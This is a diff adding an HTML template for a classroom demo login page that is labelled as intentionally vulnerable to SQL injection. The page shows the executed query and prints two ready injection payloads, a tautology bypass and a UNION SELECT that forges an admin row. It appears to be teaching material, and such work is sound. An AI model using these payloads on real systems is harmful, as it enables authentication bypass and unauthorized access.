@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SQL Injection Demo Login</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container vuln-container">
+        <h2>SQL Injection Demo</h2>
+        <p class="subtitle">This login is intentionally vulnerable for the classwork demo</p>
+
+        {% if error %}
+            <p class="message-error">{{ error }}</p>
+        {% endif %}
+
+        <form method="POST">
+            <input type="text" name="username" placeholder="Username / SQL Injection Payload" required>
+            <input type="text" name="password" placeholder="Password can be anything">
+            <button type="submit">Login</button>
+        </form>
+
+        {% if shown_query %}
+            <div class="query-box">
+                <h3>SQL Query Used:</h3>
+                <pre>{{ shown_query }}</pre>
+            </div>
+        {% endif %}
+
+        <div class="payload-box">
+            <p><strong>Way 1 payload:</strong></p>
+            <pre>' OR '1'='1' -- </pre>
+
+            <p><strong>Way 2 payload:</strong></p>
+            <pre>' AND 1=0 UNION SELECT 1,'attacker','admin' -- </pre>
+        </div>
+
+        <div class="bottom-link">
+            <a href="/">Back to Secure Login</a>
+        </div>
+    </div>
+</body>
+</html>
